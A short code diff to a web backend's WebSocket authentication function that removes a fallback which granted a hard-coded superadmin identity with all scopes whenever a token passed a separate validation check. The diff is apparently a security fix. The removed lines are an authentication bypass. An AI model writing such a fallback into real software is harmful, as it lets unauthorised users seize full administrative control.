@@ -684,7 +684,6 @@ async def _authenticate_ws(
     from backend.auth import (
         AuthenticatedPrincipal,
         get_current_session,
-        validate_session,
         validate_websocket_origin,
     )
 
@@ -706,13 +705,6 @@ async def _authenticate_ws(
                 "scopes": api_tok.get("scopes", []),
                 "is_api_token": True,
             }
-    if not sess and validate_session(token):
-        sess = {
-            "user_id": "admin-00000000-0000-0000-0000-000000000001",
-            "username": "admin",
-            "role_id": "superadmin",
-            "scopes": ["*"],
-        }
     if not sess:
         return False
 
